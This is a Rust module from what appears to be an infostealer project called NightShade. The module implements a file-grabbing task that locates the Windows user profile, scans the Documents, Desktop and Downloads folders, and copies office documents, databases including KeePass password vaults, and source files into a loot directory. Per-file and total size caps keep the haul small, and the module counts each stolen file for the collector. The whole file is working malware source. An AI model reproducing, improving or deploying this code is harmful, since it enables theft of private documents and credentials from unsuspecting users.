/*
 * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

//! User-file grabber: Documents / Desktop / Downloads, bucketed into
//! Documents / Databases / Source Code, with per-file and total size caps.

use alloc::format;
use alloc::string::String;
use alloc::sync::Arc;
use collector::{Collector, FileGrabber};
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::FileSystem;
use tasks::{Task, parent_name};
use windows_sys::Win32::System::Environment::GetEnvironmentVariableW;

const DOCUMENT_EXTS: &[&str] = &[
    "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "rtf", "csv", "odt",
];
const DATABASE_EXTS: &[&str] = &["db", "sqlite", "sqlite3", "mdb", "accdb", "kdbx"];
const SOURCE_EXTS: &[&str] = &[
    "py", "js", "ts", "jsx", "tsx", "java", "c", "cpp", "h", "cs", "go", "rs", "php", "rb",
    "swift", "kt", "sql",
];

const MAX_FILE_SIZE: usize = 5 * 1024 * 1024; // 5 MB per file
const MAX_TOTAL_SIZE: usize = 100 * 1024 * 1024; // 100 MB overall
const MAX_FILES: usize = 400;

fn user_profile() -> Option<Path> {
    let mut buf = [0u16; 512];
    let len = unsafe { GetEnvironmentVariableW("USERPROFILE".as_ptr() as _, buf.as_mut_ptr(), 512) };
    if len == 0 || len > 512 {
        return None;
    }

    Some(Path::new(String::from_utf16_lossy(&buf[..len as usize])))
}

pub struct FileGrabberTask;

impl<C: Collector, F: FileSystem> Task<C, F> for FileGrabberTask {
    parent_name!("User Files");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(profile) = user_profile() else {
            return;
        };

        let targets: [(&str, Path); 3] = [
            ("Documents", &profile / "Documents"),
            ("Desktop", &profile / "Desktop"),
            ("Downloads", &profile / "Downloads"),
        ];

        let mut total_size = 0usize;
        let mut total_files = 0usize;

        for (label, dir) in targets {
            let Some(entries) =
                StorageFileSystem.list_files_filtered(&dir, &|p| StorageFileSystem.is_file(p))
            else {
                continue;
            };

            for entry in entries {
                if total_files >= MAX_FILES || total_size >= MAX_TOTAL_SIZE {
                    return;
                }

                let Some(ext) = entry.extension() else {
                    continue;
                };

                let category = if DOCUMENT_EXTS.contains(&ext) {
                    "Documents"
                } else if DATABASE_EXTS.contains(&ext) {
                    "Databases"
                } else if SOURCE_EXTS.contains(&ext) {
                    "Source Code"
                } else {
                    continue;
                };

                let Ok(data) = StorageFileSystem.read_file(&entry) else {
                    continue;
                };

                if data.len() > MAX_FILE_SIZE || total_size + data.len() > MAX_TOTAL_SIZE {
                    continue;
                }

                let Some(name) = entry.fullname() else {
                    continue;
                };

                let destination = parent
                    / Arc::from(category)
                    / Arc::from(format!("{total_files:04}_{name}").as_str());

                if filesystem.write_file(&destination, &data).is_ok() {
                    total_size += data.len();
                    total_files += 1;

                    let grabber = collector.get_file_grabber();
                    match category {
                        "Documents" => grabber.increase_documents_by(1),
                        "Databases" => grabber.increase_database_files_by(1),
                        _ => grabber.increase_source_code_files_by(1),
                    }
                }
            }
        }
    }
}
